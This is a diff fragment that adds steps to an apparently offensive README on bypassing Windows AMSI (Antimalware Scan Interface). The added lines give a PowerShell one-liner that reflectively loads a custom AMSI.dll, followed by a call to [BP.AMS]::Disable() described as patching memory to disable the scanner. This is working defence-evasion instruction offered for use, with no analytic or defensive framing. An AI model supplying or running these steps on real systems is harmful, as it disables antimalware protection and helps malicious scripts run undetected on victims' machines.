@@ -80,3 +80,9 @@ This with create a file called AMSI.dll.
 
 ### Loading the DLL into powershell
 Now you should have the DLL called `AMSI.dll`. We need to load this into powershell to get around AMSI.
+
+To do this, type:
+`[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\AMSI.dll"))`
+
+Then, the final step is to patch the memory:
+`[BP.AMS]::Disable()`
